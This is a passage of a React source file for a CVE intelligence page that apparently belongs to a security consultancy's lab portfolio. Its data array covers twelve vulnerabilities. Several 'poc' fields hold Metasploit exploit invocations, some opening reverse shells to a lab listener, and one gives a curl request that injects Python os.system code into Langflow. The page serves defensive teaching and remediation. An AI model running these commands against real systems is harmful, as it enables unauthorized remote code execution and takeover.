import { useState, useEffect } from 'react'
import { Link } from 'react-router-dom'

const mono = "'Share Tech Mono', monospace"
const display = "'Bebas Neue', sans-serif"
const body = "'Barlow Condensed', sans-serif"
const serif = "'Cormorant Garamond', serif"

const CVE_DB = [
  {
    id: 'CVE-2011-2523', title: 'vsftpd 2.3.4 Supply Chain Backdoor',
    severity: 'CRITICAL', cvss: 10.0, vector: 'AV:N/AC:L/Au:N/C:C/I:C/A:C',
    published: '2011-07-03', lab: 'LAB-01', category: 'Supply Chain',
    affected: 'vsftpd 2.3.4', ce: 'Update Management',
    status: 'CONFIRMED EXPLOITED', statusColor: '#16a34a',
    exploitedInWild: true, cisa_kev: false,
    msf: 'exploit/unix/ftp/vsftpd_234_backdoor',
    desc: 'A malicious backdoor was deliberately introduced into the vsftpd 2.3.4 source tarball. A username containing ":)" spawns a bind shell on port 6200 — unauthenticated root access, no exploit required. Confirmed in LAB-01.',
    impact: 'Complete system compromise. Full CIA triad violation. CE Update Management automatic fail.',
    technical: 'Triggered by 0x3a 0x29 in the FTP USER command. Server forks and binds /bin/sh to TCP 6200 with root privileges.',
    remediation: '1. Remove vsftpd 2.3.4 immediately\n2. Replace with SFTP over SSH (port 22)\n3. Block port 21 at all firewall boundaries\n4. Implement CE 14-day patch management SLA',
    mitre: ['T1190 — Exploit Public-Facing Application', 'T1059.004 — Unix Shell'],
    poc: 'use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.56.105\nrun\n# Result: uid=0(root) gid=0(root)',
    timeline: [
      { date: '2011-06-30', event: 'Backdoor introduced into official SourceForge tarball' },
      { date: '2011-07-03', event: 'Discovered and publicly disclosed — CVE assigned' },
      { date: '2011-07-04', event: 'vsftpd 2.3.5 released without backdoor' },
      { date: '2026-03-08', event: 'Confirmed exploited — Tanasiom Aegis LAB-01' },
    ],
    references: ['https://nvd.nist.gov/vuln/detail/CVE-2011-2523', 'https://www.exploit-db.com/exploits/17491'],
  },
  {
    id: 'CVE-2007-2447', title: 'Samba 3.0.20 Username Map Script RCE',
    severity: 'CRITICAL', cvss: 9.3, vector: 'AV:N/AC:L/Au:N/C:C/I:C/A:C',
    published: '2007-05-14', lab: 'LAB-01', category: 'Remote Code Execution',
    affected: 'Samba 3.0.0–3.0.25rc3', ce: 'Update Management',
    status: 'CONFIRMED EXPLOITED', statusColor: '#16a34a',
    exploitedInWild: true, cisa_kev: false,
    msf: 'exploit/multi/samba/usermap_script',
    desc: 'Shell metacharacters in the Samba MS-RPC username field allow unauthenticated remote command execution. The "username map script" smb.conf option passes user input directly to /bin/sh.',
    impact: 'Remote code execution as Samba daemon user — root on Metasploitable. Second independent root path in LAB-01.',
    technical: 'Authentication request with malicious username containing backtick or semicolon sequences triggers OS command injection via the username map script handler.',
    remediation: '1. Upgrade Samba to latest supported version\n2. Remove "username map script" from smb.conf\n3. Block SMB ports 139/445 at perimeter firewall',
    mitre: ['T1190 — Exploit Public-Facing Application', 'T1021.002 — SMB/Windows Admin Shares'],
    poc: 'use exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.105\nset LHOST 192.168.56.103\nset payload cmd/unix/reverse\nrun',
    timeline: [
      { date: '2007-04-10', event: 'Vulnerability present in Samba 3.0.0' },
      { date: '2007-05-14', event: 'CVE-2007-2447 publicly disclosed' },
      { date: '2007-05-15', event: 'Samba 3.0.25 released with fix' },
      { date: '2026-03-08', event: 'Exploited in Tanasiom Aegis LAB-01' },
    ],
    references: ['https://nvd.nist.gov/vuln/detail/CVE-2007-2447', 'https://www.exploit-db.com/exploits/16320'],
  },
  {
    id: 'CVE-2004-2687', title: 'distcc Daemon Remote Code Execution',
    severity: 'CRITICAL', cvss: 9.3, vector: 'AV:N/AC:L/Au:N/C:P/I:P/A:P',
    published: '2004-12-31', lab: 'LAB-01', category: 'Remote Code Execution',
    affected: 'distcc ≤ 2.18.3', ce: 'Update Management',
    status: 'CONFIRMED EXPLOITED', statusColor: '#16a34a',
    exploitedInWild: true, cisa_kev: false,
    msf: 'exploit/unix/misc/distcc_exec',
    desc: 'distcc performs no authentication on TCP 3632. Designed to distribute build jobs, it allows arbitrary OS command execution as the daemon user. No credentials required.',
    impact: 'Remote code execution. Chains to root via SUID exploitation. Third independent root path in LAB-01.',
    technical: 'Attacker sends a "compile" job containing malicious preprocessed C code. Server executes without authentication or validation.',
    remediation: '1. Remove distcc: apt remove distcc\n2. Block port 3632 at all network boundaries\n3. CE: EOL/unsupported software is an automatic fail',
    mitre: ['T1190 — Exploit Public-Facing Application'],
    poc: 'use exploit/unix/misc/distcc_exec\nset RHOSTS 192.168.56.105\nset LHOST 192.168.56.103\nrun',
    timeline: [
      { date: '2004-12-31', event: 'CVE-2004-2687 assigned' },
      { date: '2007-01-01', event: 'Metasploitable 2 ships with vulnerable version' },
      { date: '2026-03-08', event: 'Exploited in Tanasiom Aegis LAB-01' },
    ],
    references: ['https://nvd.nist.gov/vuln/detail/CVE-2004-2687'],
  },
  {
    id: 'CVE-2010-2075', title: 'UnrealIRCd 3.2.8.1 Backdoor Command Execution',
    severity: 'CRITICAL', cvss: 10.0, vector: 'AV:N/AC:L/Au:N/C:C/I:C/A:C',
    published: '2010-06-14', lab: 'LAB-01', category: 'Supply Chain',
    affected: 'UnrealIRCd 3.2.8.1', ce: 'Update Management',
    status: 'CONFIRMED EXPLOITED', statusColor: '#16a34a',
    exploitedInWild: true, cisa_kev: false,
    msf: 'exploit/unix/irc/unreal_ircd_3281_backdoor',
    desc: 'Second supply chain attack in LAB-01. A backdoor was introduced into the UnrealIRCd 3.2.8.1 distribution archive and present for 6 months before discovery. Trigger string on port 6667 executes arbitrary commands.',
    impact: 'Unauthenticated remote code execution. Demonstrates critical importance of package checksum verification.',
    technical: 'Specific trigger string sent to port 6667 causes the IRC daemon to execute system commands. Present in source for ~6 months before discovery.',
    remediation: '1. Remove UnrealIRCd 3.2.8.1 immediately\n2. Block port 6667 at perimeter firewall\n3. Verify all package checksums before installation',
    mitre: ['T1190 — Exploit Public-Facing Application', 'T1195.002 — Compromise Software Supply Chain'],
    poc: 'use exploit/unix/irc/unreal_ircd_3281_backdoor\nset RHOSTS 192.168.56.105\nset LHOST 192.168.56.103\nset payload cmd/unix/reverse\nrun',
    timeline: [
      { date: '2009-11-01', event: 'Backdoor introduced into distribution archive' },
      { date: '2010-06-11', event: 'Backdoor discovered' },
      { date: '2010-06-14', event: 'CVE-2010-2075 assigned; clean version released' },
    ],
    references: ['https://nvd.nist.gov/vuln/detail/CVE-2010-2075'],
  },
  {
    id: 'CVE-2025-53770', title: 'Microsoft SharePoint ToolShell — Unauthenticated RCE',
    severity: 'CRITICAL', cvss: 9.8, vector: 'AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
    published: '2025-07-19', lab: null, category: 'Remote Code Execution',
    affected: 'SharePoint Server 2016, 2019, Subscription Edition', ce: 'Update Management',
    status: 'ACTIVELY EXPLOITED', statusColor: '#dc2626',
    exploitedInWild: true, cisa_kev: true,
    msf: null,
    desc: 'Critical unauthenticated RCE in Microsoft SharePoint Server ("ToolShell"). Unsafe deserialization of ViewState data. Government agencies and financial institutions confirmed as victims. CISA KEV listed.',
    impact: 'Unauthenticated RCE on perimeter-exposed SharePoint servers. Enables PowerShell execution, credential harvesting, admin account creation, lateral movement.',
    technical: 'Crafted HTTP request containing malicious serialized .NET objects sent to SharePoint. Deserialization triggers arbitrary code execution in the context of the SharePoint application pool.',
    remediation: '1. Apply Microsoft emergency patch immediately\n2. If unpatched, restrict SharePoint to VPN only\n3. Check for new admin accounts post-July 18 2025\n4. CE: Critical patches within 14 days — automatic fail if exceeded',
    mitre: ['T1190 — Exploit Public-Facing Application', 'T1505.003 — Web Shell', 'T1078.002 — Domain Accounts'],
    poc: '# No public PoC — withheld by researchers\n# Detection: Monitor for anomalous child processes of w3wp.exe\n# IOC: Unusual cmd.exe or powershell.exe spawned from w3wp.exe',
    timeline: [
      { date: '2025-07-18', event: 'Exploit chain publicly discussed by researchers' },
      { date: '2025-07-19', event: 'Microsoft and CISA confirm active exploitation' },
      { date: '2025-07-23', event: '424 servers still vulnerable per Shadowserver' },
      { date: '2025-07-24', event: 'Microsoft releases emergency out-of-band patch' },
    ],
    references: ['https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53770', 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog'],
  },
  {
    id: 'CVE-2025-3248', title: 'Langflow AI Platform Unauthenticated RCE',
    severity: 'CRITICAL', cvss: 9.8, vector: 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    published: '2025-04-02', lab: null, category: 'Remote Code Execution',
    affected: 'Langflow < 1.3.0', ce: 'Update Management',
    status: 'ACTIVELY EXPLOITED', statusColor: '#dc2626',
    exploitedInWild: true, cisa_kev: true,
    msf: null,
    desc: 'Critical flaw in the Langflow AI platform (79,000+ GitHub stars). Unauthenticated /api/v1/validate endpoint processes arbitrary Python code without validation. CISA KEV May 2025. Directly relevant to SMEs adopting AI tooling.',
    impact: 'Complete server compromise for exposed Langflow instances. Increasingly relevant as SMEs deploy AI pipelines without security review.',
    technical: '/api/v1/validate endpoint accepts and evaluates arbitrary Python code server-side. Classic unsafe eval() / exec() pattern on untrusted input.',
    remediation: '1. Upgrade Langflow to 1.3.0 or later immediately\n2. Do not expose Langflow to internet — VPN or IP allowlist only\n3. Monitor /api/v1/validate for POST requests',
    mitre: ['T1190 — Exploit Public-Facing Application', 'T1059.006 — Python'],
    poc: '# PoC (simplified):\ncurl -X POST http://target/api/v1/validate \\\n  -H "Content-Type: application/json" \\\n  -d \'{"code": "__import__(\'os\').system(\'id\')"}\'',
    timeline: [
      { date: '2025-04-02', event: 'CVE-2025-3248 publicly disclosed' },
      { date: '2025-05-05', event: 'Added to CISA KEV catalog' },
      { date: '2025-05-10', event: 'Active exploitation campaigns observed' },
    ],
    references: ['https://nvd.nist.gov/vuln/detail/CVE-2025-3248', 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog'],
  },
  {
    id: 'CVE-2025-32463', title: 'sudo Privilege Escalation — Local Root',
    severity: 'CRITICAL', cvss: 9.3, vector: 'AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H',
    published: '2025-06-15', lab: null, category: 'Privilege Escalation',
    affected: 'sudo 1.9.14–1.9.17 · 1.8.8–1.8.32', ce: 'Update Management',
    status: 'ACTIVELY EXPLOITED', statusColor: '#dc2626',
    exploitedInWild: true, cisa_kev: true,
    msf: null,
    desc: 'Critical privilege escalation in sudo — present on virtually every Linux and macOS system. Requires only low-privileged local access. CISA KEV July 2025. National CERTs worldwide issued emergency advisories.',
    impact: 'Any user with low-privileged sudo access achieves root. Standard post-phishing access becomes full system compromise within minutes.',
    technical: 'Abuse of --chroot flag combined with malicious sudoers configuration. Path traversal in chroot environment allows arbitrary command execution as root.',
    remediation: '1. Upgrade sudo: apt upgrade sudo (must be ≥ 1.9.18 or ≥ 1.8.33)\n2. Audit sudoers file: visudo -c\n3. Remove unnecessary sudo access — principle of least privilege',
    mitre: ['T1068 — Exploitation for Privilege Escalation', 'T1548.003 — Sudo and Sudo Caching'],
    poc: '# Check vulnerable version:\nsudo --version | grep -E "1\\.9\\.(1[4-7])|1\\.8\\.(8|[12][0-9]|3[0-2])"\n# Full PoC withheld — refer to CVE advisory',
    timeline: [
      { date: '2025-06-15', event: 'CVE-2025-32463 publicly disclosed' },
      { date: '2025-07-01', event: 'CISA adds to KEV; emergency advisories worldwide' },
      { date: '2025-07-05', event: 'Active exploitation in enterprise environments observed' },
    ],
    references: ['https://nvd.nist.gov/vuln/detail/CVE-2025-32463', 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog'],
  },
  {
    id: 'CVE-2025-64446', title: 'Fortinet FortiWeb Authentication Bypass',
    severity: 'CRITICAL', cvss: 9.8, vector: 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    published: '2025-10-06', lab: null, category: 'Authentication Bypass',
    affected: 'FortiWeb < patched version', ce: 'Secure Configuration',
    status: 'ACTIVELY EXPLOITED', statusColor: '#dc2626',
    exploitedInWild: true, cisa_kev: true,
    msf: null,
    desc: 'Path traversal and authentication bypass in FortiWeb\'s management interface. Active exploitation detected on honeypots within days of disclosure. Unauthenticated admin account creation.',
    impact: 'Complete firewall management bypass. Attacker creates admin accounts, disables WAF policies, exfiltrates credentials. CE Firewalls automatic fail if management interface is internet-accessible.',
    technical: 'Double-encoded URL path components bypass authentication middleware, reaching protected CGI handlers that trust client-supplied identity data.',
    remediation: '1. Apply Fortinet patch immediately\n2. Restrict management interface to dedicated management network\n3. Enable MFA on FortiWeb management interface\n4. Audit all admin accounts — remove any unrecognised',
    mitre: ['T1190 — Exploit Public-Facing Application', 'T1078.001 — Default Accounts', 'T1133 — External Remote Services'],
    poc: '# Detection:\ngrep -E "\\/api\\/v2\\.0\\/.*(%2[Ee]|%252[Ee]|\\.\\.).*" /var/log/nginx/access.log\n# IOC: New admin accounts in FortiWeb UI',
    timeline: [
      { date: '2025-10-06', event: 'Honeypot data shows active exploitation attempts' },
      { date: '2025-10-07', event: 'Fortinet confirms — CVSS 9.8 assigned' },
      { date: '2025-10-10', event: 'Patch released; CISA KEV listed' },
    ],
    references: ['https://nvd.nist.gov/vuln/detail/CVE-2025-64446', 'https://www.fortinet.com/blog/psirt-blogs'],
  },
  {
    id: 'CVE-2026-1731', title: 'BeyondTrust Remote Support — Unauthenticated RCE (CVSS 9.9)',
    severity: 'CRITICAL', cvss: 9.9, vector: 'AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
    published: '2026-02-13', lab: null, category: 'Remote Code Execution',
    affected: 'BeyondTrust Remote Support · Privileged Remote Access', ce: 'Secure Configuration',
    status: 'ACTIVELY EXPLOITED', statusColor: '#dc2626',
    exploitedInWild: true, cisa_kev: true,
    msf: null,
    desc: 'Near-maximum CVSS 9.9. Unauthenticated RCE in BeyondTrust Remote Support. In-the-wild exploitation observed within hours of disclosure. Attackers deploying SimpleHelp RMM for persistence. Federal agencies required to patch within 3 days.',
    impact: 'Unauthenticated RCE as site user. Attackers deploying remote access tools for persistence and lateral movement. Critical for SMEs using remote support tooling.',
    technical: 'Abuse of get_portal_info endpoint extracts x-ns-company value. WebSocket channel accepts OS command injection via crafted parameters. No authentication required.',
    remediation: '1. Apply BeyondTrust patch immediately — no exceptions\n2. If unpatched, take Remote Support offline\n3. Review for SimpleHelp or other RMM tools deployed\n4. Restrict Remote Support to internal/VPN only',
    mitre: ['T1190 — Exploit Public-Facing Application', 'T1219 — Remote Access Tools', 'T1021 — Remote Services'],
    poc: '# Exploitation involves:\n# 1. GET /get_portal_info → extract x-ns-company value\n# 2. Establish WebSocket channel\n# 3. Inject OS commands via WebSocket parameters\n# Detection: Monitor for SimpleHelp deployments',
    timeline: [
      { date: '2026-02-13', event: 'CVE-2026-1731 disclosed; CVSS 9.9 assigned' },
      { date: '2026-02-13', event: 'CISA KEV — immediate action required' },
      { date: '2026-02-13', event: 'watchTowr detects first exploitation within hours' },
      { date: '2026-02-16', event: 'Federal agency patching deadline' },
    ],
    references: ['https://nvd.nist.gov/vuln/detail/CVE-2026-1731', 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog'],
  },
  {
    id: 'CVE-2025-49844', title: 'Redis Lua Scripting RCE — CVSS 10.0',
    severity: 'CRITICAL', cvss: 10.0, vector: 'AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
    published: '2025-11-15', lab: null, category: 'Remote Code Execution',
    affected: 'Redis with Lua scripting enabled', ce: 'Secure Configuration',
    status: 'PATCH AVAILABLE', statusColor: '#d97706',
    exploitedInWild: true, cisa_kev: false,
    msf: null,
    desc: 'Maximum CVSS 10.0. Redis instances with Lua scripting enabled allow sandbox escape and arbitrary OS command execution. Many Redis deployments have no authentication by default — compounding risk.',
    impact: 'Complete server compromise for any Redis instance exposed to the network without authentication. Extremely common misconfiguration in SME environments using Redis as session store or cache.',
    technical: 'Crafted Lua script escapes the Redis sandbox and executes arbitrary OS commands. Unauthenticated access amplifies risk significantly.',
    remediation: '1. Patch Redis immediately\n2. Enable authentication: requirepass <strong_password>\n3. Bind to localhost only: bind 127.0.0.1\n4. Block Redis port 6379 at all network boundaries',
    mitre: ['T1190 — Exploit Public-Facing Application', 'T1548 — Abuse Elevation Control Mechanism'],
    poc: '# Check for unauthenticated Redis:\nredis-cli -h target_ip ping\n# "PONG" = no auth = vulnerable\n\nredis-cli -h target_ip config get requirepass\n# Empty value = vulnerable',
    timeline: [
      { date: '2025-11-15', event: 'CVE-2025-49844 disclosed; CVSS 10.0 assigned' },
      { date: '2025-11-15', event: 'Redis advisory published with patch' },
      { date: '2025-11-16', event: 'PoC exploits begin circulating' },
    ],
    references: ['https://nvd.nist.gov/vuln/detail/CVE-2025-49844', 'https://redis.io/blog/security-advisory-cve-2025-49844/'],
  },
  {
    id: 'CVE-2025-32432', title: 'Craft CMS Remote Code Execution — CVSS 10.0',
    severity: 'CRITICAL', cvss: 10.0, vector: 'AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
    published: '2025-04-10', lab: null, category: 'Remote Code Execution',
    affected: 'Craft CMS < 3.9.14, < 4.14.2, < 5.6.17', ce: 'Update Management',
    status: 'ACTIVELY EXPLOITED', statusColor: '#dc2626',
    exploitedInWild: true, cisa_kev: true,
    msf: null,
    desc: 'Maximum CVSS 10.0 RCE in Craft CMS via Server-Side Template Injection. Widely deployed on SME marketing sites. Active exploitation observed within 48 hours of disclosure. CISA KEV listed.',
    impact: 'Complete web server compromise for SMEs running unpatched Craft CMS. Web server compromise triggers CE failures across multiple control areas.',
    technical: 'Attacker-controlled data passed to Twig template renderer without sandboxing. SSTI leads to arbitrary code execution on the web server.',
    remediation: '1. Upgrade immediately:\n   - CMS 3.x → 3.9.14+\n   - CMS 4.x → 4.14.2+\n   - CMS 5.x → 5.6.17+\n2. If unable to patch — take site offline',
    mitre: ['T1190 — Exploit Public-Facing Application', 'T1059 — Command and Scripting Interpreter'],
    poc: '# SSTI detection (non-destructive):\n# Inject: {{ 7*7 }}\n# If "49" returned — SSTI confirmed\n# Full exploit follows SSTI → RCE chain',
    timeline: [
      { date: '2025-04-10', event: 'CVE-2025-32432 disclosed; CVSS 10.0 assigned' },
      { date: '2025-04-10', event: 'Patches released for all affected branches' },
      { date: '2025-04-12', event: 'Active exploitation observed in the wild' },
    ],
    references: ['https://nvd.nist.gov/vuln/detail/CVE-2025-32432', 'https://craftcms.com/knowledge-base/craft-cms-cve-2025-32432'],
  },
  {
    id: 'CVE-2025-1974', title: 'IngressNightmare — Kubernetes NGINX Ingress RCE',
    severity: 'CRITICAL', cvss: 9.8, vector: 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    published: '2025-03-24', lab: null, category: 'Remote Code Execution',
    affected: 'NGINX Ingress Controller for Kubernetes', ce: 'Update Management',
    status: 'PATCH AVAILABLE', statusColor: '#d97706',
    exploitedInWild: true, cisa_kev: false,
    msf: null,
    desc: '"IngressNightmare" — critical RCE in the NGINX Ingress Controller for Kubernetes. Wiz Research reported 43% of monitored cloud environments initially vulnerable. Set of 4 CVEs with the lead scoring 9.8.',
    impact: 'Unauthenticated RCE on Kubernetes clusters. Access to secrets from all namespaces, cluster admin compromise. 43% of cloud environments were vulnerable.',
    technical: 'Attacker injects malicious NGINX configuration via AdmissionWebhook requests. Handler does not properly validate configuration, allowing directive injection that triggers code execution.',
    remediation: '1. Upgrade nginx-ingress-controller to patched version immediately\n2. Verify admission webhook configuration\n3. Restrict admission webhook to internal cluster traffic only\n4. Audit all Kubernetes secrets for exposure',
    mitre: ['T1190 — Exploit Public-Facing Application', 'T1611 — Escape to Host'],
    poc: '# Detection:\nkubectl get pods -n ingress-nginx\nkubectl get validatingwebhookconfigurations\nkubectl get mutatingwebhookconfigurations\n\n# Patch check:\nhelm list -n ingress-nginx',
    timeline: [
      { date: '2025-03-24', event: 'IngressNightmare disclosed by Wiz Research' },
      { date: '2025-03-25', event: 'Emergency patch released' },
      { date: '2025-03-26', event: '43% of cloud environments found vulnerable' },
    ],
    references: ['https://nvd.nist.gov/vuln/detail/CVE-2025-1974', 'https://wiz.io/blog/ingress-nightmare'],
  },
]

const AREA_COLORS = {
  'Update Management': '#1d4ed8',
  'Secure Configuration': '#7c3aed',
  'Firewalls': '#dc2626',
  'User Access Control': '#d97706',
  'Malware Protection': '#16a34a',
}

const RESOURCES = [
  { label: 'NVD — NIST', url: 'https://nvd.nist.gov', cat: 'CVE DATABASE', desc: 'National Vulnerability Database with full CVSS scoring' },
  { label: 'CVE.org — MITRE', url: 'https://cve.org', cat: 'CVE DATABASE', desc: 'Official CVE list maintained by MITRE Corporation' },
  { label: 'CISA KEV Catalog', url: 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog', cat: 'THREAT INTEL', desc: 'Known Exploited Vulnerabilities requiring immediate action' },
  { label: 'Exploit Database', url: 'https://www.exploit-db.com', cat: 'EXPLOITS', desc: 'Offensive Security exploit archive and PoC database' },
  { label: 'NCSC Threat Reports', url: 'https://www.ncsc.gov.uk/section/about-this-website/ncsc-threat-reports', cat: 'UK NCSC', desc: 'UK national cyber threat intelligence and advisories' },
  { label: 'Rapid7 Vulnerability DB', url: 'https://www.rapid7.com/db/', cat: 'DATABASE', desc: 'Metasploit module and vulnerability reference database' },
  { label: 'Shodan CVE Explorer', url: 'https://www.shodan.io/explore/tags/cve', cat: 'THREAT INTEL', desc: 'Real-world exposed vulnerable systems by CVE' },
  { label: 'VulnHub', url: 'https://www.vulnhub.com', cat: 'PRACTICE', desc: 'Vulnerable VMs for controlled practice — Metasploitable and more' },
  { label: 'IASME Consortium', url: 'https://iasme.co.uk', cat: 'CE SCHEME', desc: 'Official Cyber Essentials certification body and resources' },
  { label: 'NCSC Cyber Essentials', url: 'https://www.ncsc.gov.uk/cyberessentials/overview', cat: 'CE SCHEME', desc: 'Official NCSC Cyber Essentials scheme overview and requirements' },
  { label: 'MITRE ATT&CK', url: 'https://attack.mitre.org', cat: 'FRAMEWORK', desc: 'Adversary tactics, techniques and procedures framework' },
  { label: 'Metasploit Framework', url: 'https://metasploit.com', cat: 'TOOLING', desc: 'Industry-standard penetration testing framework' },
]

function CVECard({ cve, isOpen, onToggle }) {
  const [tab, setTab] = useState('overview')
  const sc = cve.severity === 'CRITICAL' ? '#dc2626' : cve.severity === 'HIGH' ? '#d97706' : '#2563eb'

  return (
    <div style={{ background: '#ffffff', border: '1px solid #dde3ec', borderLeft: `4px solid ${sc}`, overflow: 'hidden', transition: 'all 0.2s', boxShadow: isOpen ? '0 4px 24px rgba(0,0,0,0.06)' : 'none' }}>

      {/* HEADER */}
      <div style={{ cursor: 'pointer', display: 'flex', alignItems: 'stretch' }} onClick={onToggle}>
        <div style={{ flex: 1, padding: '1.25rem 1.5rem', display: 'grid', gridTemplateColumns: 'auto 1fr auto auto', gap: '1rem', alignItems: 'center' }}>
          <div style={{ textAlign: 'center', minWidth: '64px' }}>
            <div style={{ fontFamily: display, fontSize: '1.8rem', color: sc, lineHeight: 1 }}>{cve.cvss}</div>
            <div style={{ fontFamily: mono, fontSize: '0.5rem', color: sc, letterSpacing: '1px' }}>{cve.severity}</div>
            <div style={{ height: '3px', background: '#edf0f5', borderRadius: '2px', marginTop: '0.35rem' }}>
              <div style={{ height: '100%', background: sc, borderRadius: '2px', width: `${(cve.cvss / 10) * 100}%` }} />
            </div>
          </div>
          <div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', flexWrap: 'wrap', marginBottom: '0.3rem' }}>
              <span style={{ fontFamily: mono, fontSize: '0.7rem', color: sc, fontWeight: 700 }}>{cve.id}</span>
              {cve.cisa_kev && <span style={{ fontFamily: mono, fontSize: '0.52rem', background: '#fef2f2', color: '#dc2626', border: '1px solid #fecaca', padding: '1px 6px', letterSpacing: '1px' }}>CISA KEV</span>}
              {cve.lab && <span style={{ fontFamily: mono, fontSize: '0.52rem', background: '#f0fdf4', color: '#16a34a', border: '1px solid #bbf7d0', padding: '1px 6px' }}>LAB: {cve.lab}</span>}
              {cve.msf && <span style={{ fontFamily: mono, fontSize: '0.52rem', background: '#faf5ff', color: '#7c3aed', border: '1px solid #e9d5ff', padding: '1px 6px' }}>MSF MODULE</span>}
              <span style={{ fontFamily: mono, fontSize: '0.52rem', color: AREA_COLORS[cve.ce] || '#1d4ed8', border: `1px solid ${AREA_COLORS[cve.ce] || '#1d4ed8'}40`, padding: '1px 6px' }}>{cve.ce.toUpperCase()}</span>
            </div>
            <div style={{ fontFamily: display, fontSize: '0.95rem', letterSpacing: '1px', color: '#0f172a', marginBottom: '0.2rem' }}>{cve.title}</div>
            <div style={{ fontFamily: mono, fontSize: '0.6rem', color: '#94a3b8' }}>{cve.affected} · {cve.category} · {cve.published}</div>
          </div>
          <div style={{ textAlign: 'center', flexShrink: 0 }}>
            <div style={{ fontFamily: mono, fontSize: '0.55rem', color: cve.statusColor, border: `1px solid ${cve.statusColor}40`, padding: '3px 8px', letterSpacing: '1px', whiteSpace: 'nowrap' }}>{cve.status}</div>
          </div>
          <div style={{ color: '#94a3b8', fontSize: '0.85rem', flexShrink: 0 }}>{isOpen ? '▲' : '▼'}</div>
        </div>
      </div>

      {/* EXPANDED */}
      {isOpen && (
        <div style={{ borderTop: '1px solid #edf0f5' }}>
          <div style={{ display: 'flex', borderBottom: '1px solid #edf0f5', background: '#f8faff', overflowX: 'auto' }}>
            {['overview', 'technical', 'timeline', 'poc', 'remediation', 'mitre'].map(t => (
              <button key={t} onClick={e => { e.stopPropagation(); setTab(t) }} style={{ background: 'none', border: 'none', cursor: 'pointer', fontFamily: mono, fontSize: '0.6rem', letterSpacing: '2px', padding: '0.65rem 1rem', whiteSpace: 'nowrap', textTransform: 'uppercase', color: tab === t ? sc : '#94a3b8', borderBottom: `2px solid ${tab === t ? sc : 'transparent'}`, transition: 'all 0.15s' }}>{t}</button>
            ))}
          </div>

          <div style={{ padding: '1.5rem' }}>

            {tab === 'overview' && (
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '2rem' }}>
                <div>
                  <div style={{ fontFamily: mono, fontSize: '0.58rem', color: '#94a3b8', letterSpacing: '2px', marginBottom: '0.5rem' }}>DESCRIPTION</div>
                  <p style={{ fontSize: '0.83rem', color: '#334155', lineHeight: 1.75, marginBottom: '1.25rem' }}>{cve.desc}</p>
                  <div style={{ fontFamily: mono, fontSize: '0.58rem', color: '#94a3b8', letterSpacing: '2px', marginBottom: '0.5rem' }}>BUSINESS IMPACT</div>
                  <p style={{ fontSize: '0.83rem', color: '#334155', lineHeight: 1.75 }}>{cve.impact}</p>
                </div>
                <div>
                  <div style={{ fontFamily: mono, fontSize: '0.58rem', color: '#94a3b8', letterSpacing: '2px', marginBottom: '0.75rem' }}>CVE INTELLIGENCE</div>
                  {[
                    { k: 'CVE ID', v: cve.id, c: sc },
                    { k: 'CVSS v3.1', v: String(cve.cvss), c: sc },
                    { k: 'Vector', v: cve.vector, mono: true },
                    { k: 'Category', v: cve.category },
                    { k: 'Affected', v: cve.affected },
                    { k: 'CE Control', v: cve.ce, c: AREA_COLORS[cve.ce] },
                    { k: 'Published', v: cve.published },
                    { k: 'MSF Module', v: cve.msf || 'None', mono: true, c: cve.msf ? '#7c3aed' : '#94a3b8' },
                    { k: 'CISA KEV', v: cve.cisa_kev ? 'YES — Actively Exploited' : 'No', c: cve.cisa_kev ? '#dc2626' : '#94a3b8' },
                    { k: 'Exploited In Wild', v: cve.exploitedInWild ? 'Confirmed' : 'Not confirmed', c: cve.exploitedInWild ? '#dc2626' : '#94a3b8' },
                  ].map(r => (
                    <div key={r.k} style={{ display: 'flex', justifyContent: 'space-between', padding: '0.4rem 0', borderBottom: '1px solid #f1f5f9', gap: '1rem' }}>
                      <span style={{ fontFamily: mono, fontSize: '0.6rem', color: '#94a3b8', flexShrink: 0 }}>{r.k}</span>
                      <span style={{ fontFamily: r.mono ? mono : body, fontSize: '0.72rem', color: r.c || '#0f172a', fontWeight: 600, textAlign: 'right', wordBreak: 'break-all' }}>{r.v}</span>
                    </div>
                  ))}
                  <div style={{ marginTop: '1rem' }}>
                    <div style={{ fontFamily: mono, fontSize: '0.58rem', color: '#94a3b8', letterSpacing: '2px', marginBottom: '0.5rem' }}>REFERENCES</div>
                    {cve.references.map(r => (
                      <a key={r} href={r} target="_blank" rel="noreferrer" style={{ display: 'block', fontFamily: mono, fontSize: '0.58rem', color: '#1d4ed8', textDecoration: 'none', marginBottom: '0.25rem', wordBreak: 'break-all' }}>↗ {r}</a>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {tab === 'technical' && (
              <div>
                <div style={{ fontFamily: mono, fontSize: '0.58rem', color: '#94a3b8', letterSpacing: '2px', marginBottom: '0.75rem' }}>TECHNICAL ANALYSIS</div>
                <p style={{ fontSize: '0.85rem', color: '#334155', lineHeight: 1.8, background: '#f8faff', padding: '1.25rem', border: '1px solid #dde3ec', borderLeft: `3px solid ${sc}`, marginBottom: '1.5rem' }}>{cve.technical}</p>
                <div style={{ fontFamily: mono, fontSize: '0.58rem', color: '#94a3b8', letterSpacing: '2px', marginBottom: '0.75rem' }}>CVSS v3.1 VECTOR</div>
                <div style={{ fontFamily: mono, fontSize: '0.7rem', color: sc, background: '#f8faff', padding: '0.75rem 1rem', border: '1px solid #dde3ec', marginBottom: '1rem' }}>{cve.vector}</div>
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '0.5rem' }}>
                  {cve.vector.split('/').slice(1).map(v => {
                    const [key, val] = v.split(':')
